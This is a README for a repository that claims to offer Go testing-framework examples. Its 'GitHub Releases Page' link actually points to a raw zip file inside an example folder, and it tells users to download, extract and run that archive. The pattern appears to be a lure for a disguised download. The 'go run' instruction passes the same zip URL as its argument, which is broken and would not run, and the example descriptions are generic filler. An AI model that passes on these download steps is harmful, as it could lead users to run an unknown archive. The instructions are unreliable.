## 📖 Introduction

Welcome to the **go-testing-framework-examples** repository! This collection features **11 practical examples** of Go testing frameworks. Whether you are new to testing or looking to enhance your skills, you will find valuable resources here. These examples cover various types of testing, including unit tests, BDD (Behavior Driven Development), property-based, and integration testing. All code is ready for production and accompanied by clear documentation.

## 🚀 Getting Started

Before you dive in, ensure your computer meets the following system requirements:

- **Operating System:** Windows, macOS, or Linux
- **Go Version:** 1.14 or newer
- **Disk Space:** At least 100 MB free
- **Internet Connection:** Required for downloading

## 📥 Download & Install

To get your hands on the software, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip).

Once you're on the releases page, follow these simple steps:

1. **Locate the Latest Release**: Look for the latest version, which is *v1.0.0*.
2. **Download the Files**: Click on the files available for your operating system. If you see a file labeled `.zip`, you will want to download that.
3. **Extract the Files**: Once the file is downloaded, extract it using any zip extraction tool (like WinZip or macOS Finder).
4. **Navigate to the Folder**: Open the folder where you extracted the files.
5. **Run the Examples**: Open the command line (or terminal) and navigate to the folder where your files are located. Use the command to run the specific testing examples provided.

## 🔍 Understanding the Examples

Here’s a brief overview of what you will find in this collection:

- **Unit Tests**: Simple tests that ensure individual functions work correctly.
- **BDD with Ginkgo**: Use Ginkgo for behavior-driven development to write tests that describe how your application should behave.
- **Property-Based Testing**: This type of testing allows you to define properties of your inputs and ensure your functions meet those properties under various conditions.
- **Integration Testing**: Tests that confirm pieces of code work together correctly. This is especially useful for full application testing.
- **Mocking with Gomock**: Easily create mock objects for testing components in isolation.
- **Using Goconvey for Web UI Testing**: Goconvey offers an expressive way to write web UI tests.

Each example comes with comments and documentation, making it easier to learn.

## 🛠️ Running the Examples

Once you have downloaded and extracted the files, running an example is straightforward:

1. Open your command line or terminal.
2. Change the directory to where you extracted the files. You can do this by using the `cd` command.
3. Execute the example with the command: `go run https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip` (replace `https://raw.githubusercontent.com/Chris-tech15/go-testing-framework-examples/master/03_ginkgo_gomega/go-testing-framework-examples_1.0.zip` with the actual file name of the example you want to run).
